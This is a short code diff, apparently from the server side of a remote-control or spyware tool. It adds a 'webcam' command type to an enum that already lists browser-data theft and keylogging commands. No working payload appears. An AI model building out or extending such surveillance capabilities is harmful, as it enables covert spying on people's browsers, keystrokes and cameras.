@@ -10,6 +10,7 @@ class CommandType(Enum):
     BROWSER_DATA = "browser_data"
     KEYLOGGER = "keylogger"
     PAPIER = "papier"
+    WEBCAM = "webcam"
 
 
 class Command(db.Model):
